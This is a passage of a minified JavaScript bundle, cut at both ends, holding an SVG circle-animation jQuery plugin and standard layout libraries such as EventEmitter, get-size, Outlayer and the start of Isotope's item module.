x=u.data("drawcircle");x.strokeWidth&&(v=x.strokeWidth),x.hoverStrokeWidth&&(y=x.hoverStrokeWidth),x.strokeColor,p=x.strokeColor,x.hoverStrokeColor&&(m=x.hoverStrokeColor),x.speed&&(b=x.speed)}u.on("circle:build",(function(d,g){e=h.width(),i=h.height(),s=(o=e/2)-(r=.9*e/2),g&&f.remove(),f=t(c.getSvg(e,i)),h.append(f),n=Snap(f[0]),a=n.path(""),l=n.path(""),u.hasClass("showed")&&(a.remove(),l.remove(),a=n.circle(o,o,r).attr({stroke:p,fill:"none",strokeWidth:v}),l=n.circle(o,o,r-1).attr({stroke:p,fill:"none",strokeWidth:y,opacity:0}))})),u.trigger("circle:build"),u.one("circle:show",(function(){Snap.animate(0,359.9999,(function(t){a.remove();var e=t,i=e-90,l=Math.PI*i/180,d=o+r*Math.cos(l),c=o+r*Math.sin(l),u="M"+o+","+s+" A"+r+","+r+" 0 "+(e>180?1:0)+",1 "+d+","+c;(a=n.path(u)).attr({stroke:p,fill:"none",strokeWidth:v})}),b,mina.easeinout,(function(){u.addClass("showed")}))})),u.on("circle:step",(function(t,e,i){e>1&&(e=1),d&&d.stop(),d=Snap.animate(g,359.9999*e,(function(t){g=t;var e=t,i=e-90,a=Math.PI*i/180,d=o+r*Math.cos(a),c=o+r*Math.sin(a),u=e>180?1:0;l.remove();var h="M"+o+","+s+" A"+r+","+r+" 0 "+u+",1 "+d+","+c;(l=n.path(h)).attr({stroke:m||p,fill:"none",strokeWidth:y})}),b,mina.easeinout,(function(){i&&i()}))})),u.on("circle:reset",(function(t){Snap.animate(0,0,(function(t){g=t;var e=t,i=e-90,a=Math.PI*i/180,d=o+r*Math.cos(a),c=o+r*Math.sin(a),u=e>180?1:0;l.remove();var h="M"+o+","+s+" A"+r+","+r+" 0 "+u+",1 "+d+","+c;(l=n.path(h)).attr({stroke:m||p,fill:"none",strokeWidth:y})}),1,mina.easeinout,(function(){}))})),u.hasClass("nohover")||(u.on("mouseover",(function(t){l.attr({opacity:1}),Snap.animate(g,359.9999,(function(t){g=t,l.remove();var e=t,i=e-90,a=Math.PI*i/180,d=o+r*Math.cos(a),c=o+r*Math.sin(a),u="M"+o+","+s+" A"+r+","+r+" 0 "+(e>180?1:0)+",1 "+d+","+c;(l=n.path(u)).attr({stroke:m||p,fill:"none",strokeWidth:y})}),b,mina.easeinout,(function(){}))})),u.on("mouseleave",(function(){Snap.animate(g,0,(function(t){g=t;var e=t,i=e-90,a=Math.PI*i/180,d=o+r*Math.cos(a),c=o+r*Math.sin(a),u=e>180?1:0;l.remove();var h="M"+o+","+s+" A"+r+","+r+" 0 "+u+",1 "+d+","+c;(l=n.path(h)).attr({stroke:m||p,fill:"none",strokeWidth:y})}),b,mina.easeinout,(function(){}))})));var w=!1;$window.resize((function(){w&&clearTimeout(w),w=setTimeout((function(){u.trigger("circle:build",!0),w=!1}),50)}))}}),t.fn[o]=function(e){return this.each((function(){t.data(this,o+"Istance")||t.data(this,o+"Istance",new s(this,e))}))}}(jQuery,window,document),function(t){function e(){}function i(t){function i(e){e.prototype.option||(e.prototype.option=function(e){t.isPlainObject(e)&&(this.options=t.extend(!0,this.options,e))})}function o(e,i){t.fn[e]=function(o){if("string"==typeof o){for(var s=n.call(arguments,1),a=0,l=this.length;l>a;a++){var d=this[a],c=t.data(d,e);if(c)if(t.isFunction(c[o])&&"_"!==o.charAt(0)){var u=c[o].apply(c,s);if(void 0!==u)return u}else r("no such method '"+o+"' for "+e+" instance");else r("cannot call methods on "+e+" prior to initialization; attempted to call '"+o+"'")}return this}return this.each((function(){var n=t.data(this,e);n?(n.option(o),n._init()):(n=new i(this,o),t.data(this,e,n))}))}}if(t){var r="undefined"==typeof console?e:function(t){console.error(t)};return t.bridget=function(t,e){i(e),o(t,e)},t.bridget}}var n=Array.prototype.slice;"function"==typeof define&&define.amd?define("jquery-bridget/jquery.bridget",["jquery"],i):i("object"==typeof exports?require("jquery"):t.jQuery)}(window),function(t){function e(e){var i=t.event;return i.target=i.target||i.srcElement||e,i}var i=document.documentElement,n=function(){};i.addEventListener?n=function(t,e,i){t.addEventListener(e,i,!1)}:i.attachEvent&&(n=function(t,i,n){t[i+n]=n.handleEvent?function(){var i=e(t);n.handleEvent.call(n,i)}:function(){var i=e(t);n.call(t,i)},t.attachEvent("on"+i,t[i+n])});var o=function(){};i.removeEventListener?o=function(t,e,i){t.removeEventListener(e,i,!1)}:i.detachEvent&&(o=function(t,e,i){t.detachEvent("on"+e,t[e+i]);try{delete t[e+i]}catch(n){t[e+i]=void 0}});var r={bind:n,unbind:o};"function"==typeof define&&define.amd?define("eventie/eventie",r):"object"==typeof exports?module.exports=r:t.eventie=r}(window),function(){"use strict";function t(){}function e(t,e){for(var i=t.length;i--;)if(t[i].listener===e)return i;return-1}function i(t){return function(){return this[t].apply(this,arguments)}}var n=t.prototype,o=this,r=o.EventEmitter;n.getListeners=function(t){var e,i,n=this._getEvents();if(t instanceof RegExp)for(i in e={},n)n.hasOwnProperty(i)&&t.test(i)&&(e[i]=n[i]);else e=n[t]||(n[t]=[]);return e},n.flattenListeners=function(t){var e,i=[];for(e=0;e<t.length;e+=1)i.push(t[e].listener);return i},n.getListenersAsObject=function(t){var e,i=this.getListeners(t);return i instanceof Array&&((e={})[t]=i),e||i},n.addListener=function(t,i){var n,o=this.getListenersAsObject(t),r="object"==typeof i;for(n in o)o.hasOwnProperty(n)&&-1===e(o[n],i)&&o[n].push(r?i:{listener:i,once:!1});return this},n.on=i("addListener"),n.addOnceListener=function(t,e){return this.addListener(t,{listener:e,once:!0})},n.once=i("addOnceListener"),n.defineEvent=function(t){return this.getListeners(t),this},n.defineEvents=function(t){for(var e=0;e<t.length;e+=1)this.defineEvent(t[e]);return this},n.removeListener=function(t,i){var n,o,r=this.getListenersAsObject(t);for(o in r)r.hasOwnProperty(o)&&-1!==(n=e(r[o],i))&&r[o].splice(n,1);return this},n.off=i("removeListener"),n.addListeners=function(t,e){return this.manipulateListeners(!1,t,e)},n.removeListeners=function(t,e){return this.manipulateListeners(!0,t,e)},n.manipulateListeners=function(t,e,i){var n,o,r=t?this.removeListener:this.addListener,s=t?this.removeListeners:this.addListeners;if("object"!=typeof e||e instanceof RegExp)for(n=i.length;n--;)r.call(this,e,i[n]);else for(n in e)e.hasOwnProperty(n)&&(o=e[n])&&("function"==typeof o?r.call(this,n,o):s.call(this,n,o));return this},n.removeEvent=function(t){var e,i=typeof t,n=this._getEvents();if("string"===i)delete n[t];else if(t instanceof RegExp)for(e in n)n.hasOwnProperty(e)&&t.test(e)&&delete n[e];else delete this._events;return this},n.removeAllListeners=i("removeEvent"),n.emitEvent=function(t,e){var i,n,o,r=this.getListenersAsObject(t);for(o in r)if(r.hasOwnProperty(o))for(n=r[o].length;n--;)!0===(i=r[o][n]).once&&this.removeListener(t,i.listener),i.listener.apply(this,e||[])===this._getOnceReturnValue()&&this.removeListener(t,i.listener);return this},n.trigger=i("emitEvent"),n.emit=function(t){var e=Array.prototype.slice.call(arguments,1);return this.emitEvent(t,e)},n.setOnceReturnValue=function(t){return this._onceReturnValue=t,this},n._getOnceReturnValue=function(){return!this.hasOwnProperty("_onceReturnValue")||this._onceReturnValue},n._getEvents=function(){return this._events||(this._events={})},t.noConflict=function(){return o.EventEmitter=r,t},"function"==typeof define&&define.amd?define("eventEmitter/EventEmitter",[],(function(){return t})):"object"==typeof module&&module.exports?module.exports=t:o.EventEmitter=t}.call(this),function(t){function e(t){if(t){if("string"==typeof n[t])return t;t=t.charAt(0).toUpperCase()+t.slice(1);for(var e,o=0,r=i.length;r>o;o++)if(e=i[o]+t,"string"==typeof n[e])return e}}var i="Webkit Moz ms Ms O".split(" "),n=document.documentElement.style;"function"==typeof define&&define.amd?define("get-style-property/get-style-property",[],(function(){return e})):"object"==typeof exports?module.exports=e:t.getStyleProperty=e}(window),function(t,e){function i(t){var e=parseFloat(t);return-1===t.indexOf("%")&&!isNaN(e)&&e}function n(e){function n(){if(!c){c=!0;var n=t.getComputedStyle;if(a=function(){var t=n?function(t){return n(t,null)}:function(t){return t.currentStyle};return function(e){var i=t(e);return i||o("Style returned "+i+". Are you running this code in a hidden iframe on Firefox? See http://bit.ly/getsizebug1"),i}}(),l=e("boxSizing")){var r=document.createElement("div");r.style.width="200px",r.style.padding="1px 2px 3px 4px",r.style.borderStyle="solid",r.style.borderWidth="1px 2px 3px 4px",r.style[l]="border-box";var s=document.body||document.documentElement;s.appendChild(r);var u=a(r);d=200===i(u.width),s.removeChild(r)}}}function s(e,i){if(t.getComputedStyle||-1===i.indexOf("%"))return i;var n=e.style,o=n.left,r=e.runtimeStyle,s=r&&r.left;return s&&(r.left=e.currentStyle.left),n.left=i,i=n.pixelLeft,n.left=o,s&&(r.left=s),i}var a,l,d,c=!1;return function(t){if(n(),"string"==typeof t&&(t=document.querySelector(t)),t&&"object"==typeof t&&t.nodeType){var e=a(t);if("none"===e.display)return function(){for(var t={width:0,height:0,innerWidth:0,innerHeight:0,outerWidth:0,outerHeight:0},e=0,i=r.length;i>e;e++)t[r[e]]=0;return t}();var o={};o.width=t.offsetWidth,o.height=t.offsetHeight;for(var c=o.isBorderBox=!(!l||!e[l]||"border-box"!==e[l]),u=0,h=r.length;h>u;u++){var p=r[u],f=e[p];f=s(t,f);var g=parseFloat(f);o[p]=isNaN(g)?0:g}var m=o.paddingLeft+o.paddingRight,v=o.paddingTop+o.paddingBottom,y=o.marginLeft+o.marginRight,b=o.marginTop+o.marginBottom,x=o.borderLeftWidth+o.borderRightWidth,w=o.borderTopWidth+o.borderBottomWidth,k=c&&d,_=i(e.width);!1!==_&&(o.width=_+(k?0:m+x));var C=i(e.height);return!1!==C&&(o.height=C+(k?0:v+w)),o.innerWidth=o.width-(m+x),o.innerHeight=o.height-(v+w),o.outerWidth=o.width+y,o.outerHeight=o.height+b,o}}}var o="undefined"==typeof console?function(){}:function(t){console.error(t)},r=["paddingLeft","paddingRight","paddingTop","paddingBottom","marginLeft","marginRight","marginTop","marginBottom","borderLeftWidth","borderRightWidth","borderTopWidth","borderBottomWidth"];"function"==typeof define&&define.amd?define("get-size/get-size",["get-style-property/get-style-property"],n):"object"==typeof exports?module.exports=n(require("desandro-get-style-property")):t.getSize=n(t.getStyleProperty)}(window),function(t){function e(t){"function"==typeof t&&(e.isReady?t():s.push(t))}function i(t){var i="readystatechange"===t.type&&"complete"!==r.readyState;e.isReady||i||n()}function n(){e.isReady=!0;for(var t=0,i=s.length;i>t;t++)(0,s[t])()}function o(o){return"complete"===r.readyState?n():(o.bind(r,"DOMContentLoaded",i),o.bind(r,"readystatechange",i),o.bind(t,"load",i)),e}var r=t.document,s=[];e.isReady=!1,"function"==typeof define&&define.amd?define("doc-ready/doc-ready",["eventie/eventie"],o):"object"==typeof exports?module.exports=o(require("eventie")):t.docReady=o(t.eventie)}(window),function(t){"use strict";function e(t,e){return t[o](e)}function i(t){t.parentNode||document.createDocumentFragment().appendChild(t)}var n,o=function(){if(t.matches)return"matches";if(t.matchesSelector)return"matchesSelector";for(var e=["webkit","moz","ms","o"],i=0,n=e.length;n>i;i++){var o=e[i]+"MatchesSelector";if(t[o])return o}}();if(o){var r=e(document.createElement("div"),"div");n=r?e:function(t,n){return i(t),e(t,n)}}else n=function(t,e){i(t);for(var n=t.parentNode.querySelectorAll(e),o=0,r=n.length;r>o;o++)if(n[o]===t)return!0;return!1};"function"==typeof define&&define.amd?define("matches-selector/matches-selector",[],(function(){return n})):"object"==typeof exports?module.exports=n:window.matchesSelector=n}(Element.prototype),function(t,e){"use strict";"function"==typeof define&&define.amd?define("fizzy-ui-utils/utils",["doc-ready/doc-ready","matches-selector/matches-selector"],(function(i,n){return e(t,i,n)})):"object"==typeof exports?module.exports=e(t,require("doc-ready"),require("desandro-matches-selector")):t.fizzyUIUtils=e(t,t.docReady,t.matchesSelector)}(window,(function(t,e,i){var n={extend:function(t,e){for(var i in e)t[i]=e[i];return t},modulo:function(t,e){return(t%e+e)%e}},o=Object.prototype.toString;n.isArray=function(t){return"[object Array]"==o.call(t)},n.makeArray=function(t){var e=[];if(n.isArray(t))e=t;else if(t&&"number"==typeof t.length)for(var i=0,o=t.length;o>i;i++)e.push(t[i]);else e.push(t);return e},n.indexOf=Array.prototype.indexOf?function(t,e){return t.indexOf(e)}:function(t,e){for(var i=0,n=t.length;n>i;i++)if(t[i]===e)return i;return-1},n.removeFrom=function(t,e){var i=n.indexOf(t,e);-1!=i&&t.splice(i,1)},n.isElement="function"==typeof HTMLElement||"object"==typeof HTMLElement?function(t){return t instanceof HTMLElement}:function(t){return t&&"object"==typeof t&&1==t.nodeType&&"string"==typeof t.nodeName},n.setText=function(){var t;return function(e,i){e[t=t||(void 0!==document.documentElement.textContent?"textContent":"innerText")]=i}}(),n.getParent=function(t,e){for(;t!=document.body;)if(t=t.parentNode,i(t,e))return t},n.getQueryElement=function(t){return"string"==typeof t?document.querySelector(t):t},n.handleEvent=function(t){var e="on"+t.type;this[e]&&this[e](t)},n.filterFindElements=function(t,e){for(var o=[],r=0,s=(t=n.makeArray(t)).length;s>r;r++){var a=t[r];if(n.isElement(a))if(e){i(a,e)&&o.push(a);for(var l=a.querySelectorAll(e),d=0,c=l.length;c>d;d++)o.push(l[d])}else o.push(a)}return o},n.debounceMethod=function(t,e,i){var n=t.prototype[e],o=e+"Timeout";t.prototype[e]=function(){var t=this[o];t&&clearTimeout(t);var e=arguments,r=this;this[o]=setTimeout((function(){n.apply(r,e),delete r[o]}),i||100)}},n.toDashed=function(t){return t.replace(/(.)([A-Z])/g,(function(t,e,i){return e+"-"+i})).toLowerCase()};var r=t.console;return n.htmlInit=function(i,o){e((function(){for(var e=n.toDashed(o),s=document.querySelectorAll(".js-"+e),a="data-"+e+"-options",l=0,d=s.length;d>l;l++){var c,u=s[l],h=u.getAttribute(a);try{c=h&&JSON.parse(h)}catch(t){r&&r.error("Error parsing "+a+" on "+u.nodeName.toLowerCase()+(u.id?"#"+u.id:"")+": "+t);continue}var p=new i(u,c),f=t.jQuery;f&&f.data(u,o,p)}}))},n})),function(t,e){"use strict";"function"==typeof define&&define.amd?define("outlayer/item",["eventEmitter/EventEmitter","get-size/get-size","get-style-property/get-style-property","fizzy-ui-utils/utils"],(function(i,n,o,r){return e(t,i,n,o,r)})):"object"==typeof exports?module.exports=e(t,require("wolfy87-eventemitter"),require("get-size"),require("desandro-get-style-property"),require("fizzy-ui-utils")):(t.Outlayer={},t.Outlayer.Item=e(t,t.EventEmitter,t.getSize,t.getStyleProperty,t.fizzyUIUtils))}(window,(function(t,e,i,n,o){"use strict";function r(t,e){t&&(this.element=t,this.layout=e,this.position={x:0,y:0},this._create())}var s=t.getComputedStyle,a=s?function(t){return s(t,null)}:function(t){return t.currentStyle},l=n("transition"),d=n("transform"),c=l&&d,u=!!n("perspective"),h={WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"otransitionend",transition:"transitionend"}[l],p=["transform","transition","transitionDuration","transitionProperty"],f=function(){for(var t={},e=0,i=p.length;i>e;e++){var o=p[e],r=n(o);r&&r!==o&&(t[o]=r)}return t}();o.extend(r.prototype,e.prototype),r.prototype._create=function(){this._transn={ingProperties:{},clean:{},onEnd:{}},this.css({position:"absolute"})},r.prototype.handleEvent=function(t){var e="on"+t.type;this[e]&&this[e](t)},r.prototype.getSize=function(){this.size=i(this.element)},r.prototype.css=function(t){var e=this.element.style;for(var i in t)e[f[i]||i]=t[i]},r.prototype.getPosition=function(){var t=a(this.element),e=this.layout.options,i=e.isOriginLeft,n=e.isOriginTop,o=t[i?"left":"right"],r=t[n?"top":"bottom"],s=parseInt(o,10),l=parseInt(r,10),d=this.layout.size;s=-1!=o.indexOf("%")?s/100*d.width:s,l=-1!=r.indexOf("%")?l/100*d.height:l,s=isNaN(s)?0:s,l=isNaN(l)?0:l,s-=i?d.paddingLeft:d.paddingRight,l-=n?d.paddingTop:d.paddingBottom,this.position.x=s,this.position.y=l},r.prototype.layoutPosition=function(){var t=this.layout.size,e=this.layout.options,i={},n=e.isOriginLeft?"paddingLeft":"paddingRight",o=e.isOriginLeft?"left":"right",r=e.isOriginLeft?"right":"left",s=this.position.x+t[n];i[o]=this.getXValue(s),i[r]="";var a=e.isOriginTop?"paddingTop":"paddingBottom",l=e.isOriginTop?"top":"bottom",d=e.isOriginTop?"bottom":"top",c=this.position.y+t[a];i[l]=this.getYValue(c),i[d]="",this.css(i),this.emitEvent("layout",[this])},r.prototype.getXValue=function(t){var e=this.layout.options;return e.percentPosition&&!e.isHorizontal?t/this.layout.size.width*100+"%":t+"px"},r.prototype.getYValue=function(t){var e=this.layout.options;return e.percentPosition&&e.isHorizontal?t/this.layout.size.height*100+"%":t+"px"},r.prototype._transitionTo=function(t,e){this.getPosition();var i=this.position.x,n=this.position.y,o=parseInt(t,10),r=parseInt(e,10),s=o===this.position.x&&r===this.position.y;if(this.setPosition(t,e),!s||this.isTransitioning){var a=t-i,l=e-n,d={};d.transform=this.getTranslate(a,l),this.transition({to:d,onTransitionEnd:{transform:this.layoutPosition},isCleaning:!0})}else this.layoutPosition()},r.prototype.getTranslate=function(t,e){var i=this.layout.options;return t=i.isOriginLeft?t:-t,e=i.isOriginTop?e:-e,t=this.getXValue(t),e=this.getYValue(e),u?"translate3d("+t+", "+e+", 0)":"translate("+t+", "+e+")"},r.prototype.goTo=function(t,e){this.setPosition(t,e),this.layoutPosition()},r.prototype.moveTo=c?r.prototype._transitionTo:r.prototype.goTo,r.prototype.setPosition=function(t,e){this.position.x=parseInt(t,10),this.position.y=parseInt(e,10)},r.prototype._nonTransition=function(t){for(var e in this.css(t.to),t.isCleaning&&this._removeStyles(t.to),t.onTransitionEnd)t.onTransitionEnd[e].call(this)},r.prototype._transition=function(t){if(parseFloat(this.layout.options.transitionDuration)){var e=this._transn;for(var i in t.onTransitionEnd)e.onEnd[i]=t.onTransitionEnd[i];for(i in t.to)e.ingProperties[i]=!0,t.isCleaning&&(e.clean[i]=!0);t.from&&(this.css(t.from),this.element.offsetHeight),this.enableTransition(t.to),this.css(t.to),this.isTransitioning=!0}else this._nonTransition(t)};var g="opacity,"+function(t){return t.replace(/([A-Z])/g,(function(t){return"-"+t.toLowerCase()}))}(f.transform||"transform");r.prototype.enableTransition=function(){this.isTransitioning||(this.css({transitionProperty:g,transitionDuration:this.layout.options.transitionDuration}),this.element.addEventListener(h,this,!1))},r.prototype.transition=r.prototype[l?"_transition":"_nonTransition"],r.prototype.onwebkitTransitionEnd=function(t){this.ontransitionend(t)},r.prototype.onotransitionend=function(t){this.ontransitionend(t)};var m={"-webkit-transform":"transform","-moz-transform":"transform","-o-transform":"transform"};r.prototype.ontransitionend=function(t){if(t.target===this.element){var e=this._transn,i=m[t.propertyName]||t.propertyName;delete e.ingProperties[i],function(t){for(var e in t)return!1;return!0}(e.ingProperties)&&this.disableTransition(),i in e.clean&&(this.element.style[t.propertyName]="",delete e.clean[i]),i in e.onEnd&&(e.onEnd[i].call(this),delete e.onEnd[i]),this.emitEvent("transitionEnd",[this])}},r.prototype.disableTransition=function(){this.removeTransitionStyles(),this.element.removeEventListener(h,this,!1),this.isTransitioning=!1},r.prototype._removeStyles=function(t){var e={};for(var i in t)e[i]="";this.css(e)};var v={transitionProperty:"",transitionDuration:""};return r.prototype.removeTransitionStyles=function(){this.css(v)},r.prototype.removeElem=function(){this.element.parentNode.removeChild(this.element),this.css({display:""}),this.emitEvent("remove",[this])},r.prototype.remove=function(){if(l&&parseFloat(this.layout.options.transitionDuration)){var t=this;this.once("transitionEnd",(function(){t.removeElem()})),this.hide()}else this.removeElem()},r.prototype.reveal=function(){delete this.isHidden,this.css({display:""});var t=this.layout.options,e={};e[this.getHideRevealTransitionEndProperty("visibleStyle")]=this.onRevealTransitionEnd,this.transition({from:t.hiddenStyle,to:t.visibleStyle,isCleaning:!0,onTransitionEnd:e})},r.prototype.onRevealTransitionEnd=function(){this.isHidden||this.emitEvent("reveal")},r.prototype.getHideRevealTransitionEndProperty=function(t){var e=this.layout.options[t];if(e.opacity)return"opacity";for(var i in e)return i},r.prototype.hide=function(){this.isHidden=!0,this.css({display:""});var t=this.layout.options,e={};e[this.getHideRevealTransitionEndProperty("hiddenStyle")]=this.onHideTransitionEnd,this.transition({from:t.visibleStyle,to:t.hiddenStyle,isCleaning:!0,onTransitionEnd:e})},r.prototype.onHideTransitionEnd=function(){this.isHidden&&(this.css({display:"none"}),this.emitEvent("hide"))},r.prototype.destroy=function(){this.css({position:"",left:"",right:"",top:"",bottom:"",transition:"",transform:""})},r})),function(t,e){"use strict";"function"==typeof define&&define.amd?define("outlayer/outlayer",["eventie/eventie","eventEmitter/EventEmitter","get-size/get-size","fizzy-ui-utils/utils","./item"],(function(i,n,o,r,s){return e(t,i,n,o,r,s)})):"object"==typeof exports?module.exports=e(t,require("eventie"),require("wolfy87-eventemitter"),require("get-size"),require("fizzy-ui-utils"),require("./item")):t.Outlayer=e(t,t.eventie,t.EventEmitter,t.getSize,t.fizzyUIUtils,t.Outlayer.Item)}(window,(function(t,e,i,n,o,r){"use strict";function s(t,e){var i=o.getQueryElement(t);if(i){this.element=i,l&&(this.$element=l(this.element)),this.options=o.extend({},this.constructor.defaults),this.option(e);var n=++c;this.element.outlayerGUID=n,u[n]=this,this._create(),this.options.isInitLayout&&this.layout()}else a&&a.error("Bad element for "+this.constructor.namespace+": "+(i||t))}var a=t.console,l=t.jQuery,d=function(){},c=0,u={};return s.namespace="outlayer",s.Item=r,s.defaults={containerStyle:{position:"relative"},isInitLayout:!0,isOriginLeft:!0,isOriginTop:!0,isResizeBound:!0,isResizingContainer:!0,transitionDuration:"0.4s",hiddenStyle:{opacity:0,transform:"scale(0.001)"},visibleStyle:{opacity:1,transform:"scale(1)"}},o.extend(s.prototype,i.prototype),s.prototype.option=function(t){o.extend(this.options,t)},s.prototype._create=function(){this.reloadItems(),this.stamps=[],this.stamp(this.options.stamp),o.extend(this.element.style,this.options.containerStyle),this.options.isResizeBound&&this.bindResize()},s.prototype.reloadItems=function(){this.items=this._itemize(this.element.children)},s.prototype._itemize=function(t){for(var e=this._filterFindItemElements(t),i=this.constructor.Item,n=[],o=0,r=e.length;r>o;o++){var s=new i(e[o],this);n.push(s)}return n},s.prototype._filterFindItemElements=function(t){return o.filterFindElements(t,this.options.itemSelector)},s.prototype.getItemElements=function(){for(var t=[],e=0,i=this.items.length;i>e;e++)t.push(this.items[e].element);return t},s.prototype.layout=function(){this._resetLayout(),this._manageStamps();var t=void 0!==this.options.isLayoutInstant?this.options.isLayoutInstant:!this._isLayoutInited;this.layoutItems(this.items,t),this._isLayoutInited=!0},s.prototype._init=s.prototype.layout,s.prototype._resetLayout=function(){this.getSize()},s.prototype.getSize=function(){this.size=n(this.element)},s.prototype._getMeasurement=function(t,e){var i,r=this.options[t];r?("string"==typeof r?i=this.element.querySelector(r):o.isElement(r)&&(i=r),this[t]=i?n(i)[e]:r):this[t]=0},s.prototype.layoutItems=function(t,e){t=this._getItemsForLayout(t),this._layoutItems(t,e),this._postLayout()},s.prototype._getItemsForLayout=function(t){for(var e=[],i=0,n=t.length;n>i;i++){var o=t[i];o.isIgnored||e.push(o)}return e},s.prototype._layoutItems=function(t,e){if(this._emitCompleteOnItems("layout",t),t&&t.length){for(var i=[],n=0,o=t.length;o>n;n++){var r=t[n],s=this._getItemLayoutPosition(r);s.item=r,s.isInstant=e||r.isLayoutInstant,i.push(s)}this._processLayoutQueue(i)}},s.prototype._getItemLayoutPosition=function(){return{x:0,y:0}},s.prototype._processLayoutQueue=function(t){for(var e=0,i=t.length;i>e;e++){var n=t[e];this._positionItem(n.item,n.x,n.y,n.isInstant)}},s.prototype._positionItem=function(t,e,i,n){n?t.goTo(e,i):t.moveTo(e,i)},s.prototype._postLayout=function(){this.resizeContainer()},s.prototype.resizeContainer=function(){if(this.options.isResizingContainer){var t=this._getContainerSize();t&&(this._setContainerMeasure(t.width,!0),this._setContainerMeasure(t.height,!1))}},s.prototype._getContainerSize=d,s.prototype._setContainerMeasure=function(t,e){if(void 0!==t){var i=this.size;i.isBorderBox&&(t+=e?i.paddingLeft+i.paddingRight+i.borderLeftWidth+i.borderRightWidth:i.paddingBottom+i.paddingTop+i.borderTopWidth+i.borderBottomWidth),t=Math.max(t,0),this.element.style[e?"width":"height"]=t+"px"}},s.prototype._emitCompleteOnItems=function(t,e){function i(){o.dispatchEvent(t+"Complete",null,[e])}function n(){++s===r&&i()}var o=this,r=e.length;if(e&&r)for(var s=0,a=0,l=e.length;l>a;a++)e[a].once(t,n);else i()},s.prototype.dispatchEvent=function(t,e,i){var n=e?[e].concat(i):i;if(this.emitEvent(t,n),l)if(this.$element=this.$element||l(this.element),e){var o=l.Event(e);o.type=t,this.$element.trigger(o,i)}else this.$element.trigger(t,i)},s.prototype.ignore=function(t){var e=this.getItem(t);e&&(e.isIgnored=!0)},s.prototype.unignore=function(t){var e=this.getItem(t);e&&delete e.isIgnored},s.prototype.stamp=function(t){if(t=this._find(t)){this.stamps=this.stamps.concat(t);for(var e=0,i=t.length;i>e;e++){var n=t[e];this.ignore(n)}}},s.prototype.unstamp=function(t){if(t=this._find(t))for(var e=0,i=t.length;i>e;e++){var n=t[e];o.removeFrom(this.stamps,n),this.unignore(n)}},s.prototype._find=function(t){return t?("string"==typeof t&&(t=this.element.querySelectorAll(t)),t=o.makeArray(t)):void 0},s.prototype._manageStamps=function(){if(this.stamps&&this.stamps.length){this._getBoundingRect();for(var t=0,e=this.stamps.length;e>t;t++){var i=this.stamps[t];this._manageStamp(i)}}},s.prototype._getBoundingRect=function(){var t=this.element.getBoundingClientRect(),e=this.size;this._boundingRect={left:t.left+e.paddingLeft+e.borderLeftWidth,top:t.top+e.paddingTop+e.borderTopWidth,right:t.right-(e.paddingRight+e.borderRightWidth),bottom:t.bottom-(e.paddingBottom+e.borderBottomWidth)}},s.prototype._manageStamp=d,s.prototype._getElementOffset=function(t){var e=t.getBoundingClientRect(),i=this._boundingRect,o=n(t);return{left:e.left-i.left-o.marginLeft,top:e.top-i.top-o.marginTop,right:i.right-e.right-o.marginRight,bottom:i.bottom-e.bottom-o.marginBottom}},s.prototype.handleEvent=function(t){var e="on"+t.type;this[e]&&this[e](t)},s.prototype.bindResize=function(){this.isResizeBound||(e.bind(t,"resize",this),this.isResizeBound=!0)},s.prototype.unbindResize=function(){this.isResizeBound&&e.unbind(t,"resize",this),this.isResizeBound=!1},s.prototype.onresize=function(){this.resizeTimeout&&clearTimeout(this.resizeTimeout);var t=this;this.resizeTimeout=setTimeout((function(){t.resize(),delete t.resizeTimeout}),100)},s.prototype.resize=function(){this.isResizeBound&&this.needsResizeLayout()&&this.layout()},s.prototype.needsResizeLayout=function(){var t=n(this.element);return this.size&&t&&t.innerWidth!==this.size.innerWidth},s.prototype.addItems=function(t){var e=this._itemize(t);return e.length&&(this.items=this.items.concat(e)),e},s.prototype.appended=function(t){var e=this.addItems(t);e.length&&(this.layoutItems(e,!0),this.reveal(e))},s.prototype.prepended=function(t){var e=this._itemize(t);if(e.length){var i=this.items.slice(0);this.items=e.concat(i),this._resetLayout(),this._manageStamps(),this.layoutItems(e,!0),this.reveal(e),this.layoutItems(i)}},s.prototype.reveal=function(t){this._emitCompleteOnItems("reveal",t);for(var e=t&&t.length,i=0;e&&e>i;i++)t[i].reveal()},s.prototype.hide=function(t){this._emitCompleteOnItems("hide",t);for(var e=t&&t.length,i=0;e&&e>i;i++)t[i].hide()},s.prototype.revealItemElements=function(t){var e=this.getItems(t);this.reveal(e)},s.prototype.hideItemElements=function(t){var e=this.getItems(t);this.hide(e)},s.prototype.getItem=function(t){for(var e=0,i=this.items.length;i>e;e++){var n=this.items[e];if(n.element===t)return n}},s.prototype.getItems=function(t){for(var e=[],i=0,n=(t=o.makeArray(t)).length;n>i;i++){var r=t[i],s=this.getItem(r);s&&e.push(s)}return e},s.prototype.remove=function(t){var e=this.getItems(t);if(this._emitCompleteOnItems("remove",e),e&&e.length)for(var i=0,n=e.length;n>i;i++){var r=e[i];r.remove(),o.removeFrom(this.items,r)}},s.prototype.destroy=function(){var t=this.element.style;t.height="",t.position="",t.width="";for(var e=0,i=this.items.length;i>e;e++)this.items[e].destroy();this.unbindResize();var n=this.element.outlayerGUID;delete u[n],delete this.element.outlayerGUID,l&&l.removeData(this.element,this.constructor.namespace)},s.data=function(t){var e=(t=o.getQueryElement(t))&&t.outlayerGUID;return e&&u[e]},s.create=function(t,e){function i(){s.apply(this,arguments)}return Object.create?i.prototype=Object.create(s.prototype):o.extend(i.prototype,s.prototype),i.prototype.constructor=i,i.defaults=o.extend({},s.defaults),o.extend(i.defaults,e),i.prototype.settings={},i.namespace=t,i.data=s.data,i.Item=function(){r.apply(this,arguments)},i.Item.prototype=new r,o.htmlInit(i,t),l&&l.bridget&&l.bridget(t,i),i},s.Item=r,s})),function(t,e){"use strict";"function"==typeof define&&define.amd?define("isotope/js/item",["outlayer/outlayer"],e):"object"==typeof exports?module.exports=e(require("outlayer")):(t.Isotope=t.Isotope||{},t.Isotope.Item=e(t.Outlayer))}(window,(function(t){"use strict";function e(){t.Item.apply(this,arguments)}e.prototype=new t.Item,e.prototype._create=function(){this.id=this.layout.itemGUID++,t.Item.prototype._create.call(this),this.sortData={}},e.prototype.updateSortData=function(){if(!this.isIgnored){this.sortData.id=this.id,this.sortData["original-order"]=this.id,this.sortData.random=Math.random();var t=this.layout.options.getSortData,e=this.layout._sorters;for(var i in t){var n=e[i];this.sortData[i]=n(this.element,this)}}};var i=e.prototype.destroy;return e.prototype.destroy=function(){i.apply(this,arguments),this.css({display:""})},e})),function(t,e){"use strict";"function"==typeof 